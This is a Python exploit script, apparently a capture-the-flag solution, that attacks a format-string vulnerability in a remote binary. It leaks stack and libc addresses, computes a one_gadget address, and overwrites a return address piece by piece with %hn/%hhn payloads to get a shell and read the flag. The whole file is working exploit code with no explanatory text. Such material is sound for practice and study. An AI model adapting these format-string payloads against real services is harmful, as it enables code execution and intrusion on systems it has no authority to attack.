from parse_args_and_some_func import *

sh:tube = all_parsed_args['io']

sh.sendline("%9$p,%24$p")
msg = sh.recvline()
stack_addr, libc_addr = msg[:-1].split(b',')

stack_addr = int16(stack_addr.decode())
libc_addr = int16(libc_addr.decode())
LOG_ADDR('stack_addr', stack_addr)
LOG_ADDR('libc_addr', libc_addr)

stack_ret_addr = stack_addr - 0xe0
libc_base_addr = libc_addr - 0x3e7638

LOG_ADDR('stack_ret_addr', stack_ret_addr)
LOG_ADDR('libc_base_addr', libc_base_addr)

gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = libc_base_addr + gadgets[0]

LOG_ADDR('one_gadget', one_gadget)
sleep(1)

payload = "%{}c%9$hn".format((stack_ret_addr & 0xffff))
sh.sendline(payload)
sh.recv()

for _ in range(2):
    sh.sendline('a' * 0x30)
    sh.recv()
    sleep(2)

payload = "%{}c%35$hn".format((one_gadget & 0xffff)) + 'a' * 0x10
sh.sendline(payload)
sh.recv()
sleep(2)


for _ in range(2):
    sh.sendline('a' * 0x30)
    sh.recv()
    sleep(2)

payload = "%{}c%9$hhn".format((stack_ret_addr & 0xff) + 2)
sh.sendline(payload)
sh.recv()
sleep(2)

for _ in range(2):
    sh.sendline('a' * 0x30)
    sh.recv()
    sleep(2)

payload = "%{}c%35$hhn".format(((one_gadget >> 16) & 0xff)) + 'a' * 0x10
sh.sendline(payload)
sh.recv()
sleep(2)

for _ in range(2):
    sh.sendline('a' * 0x30)
    sh.recv()
    sleep(2)

sh.send("6" * 8 + '\x00' * 8)

sleep(3)

sh.sendline("cat flag")

sh.interactive()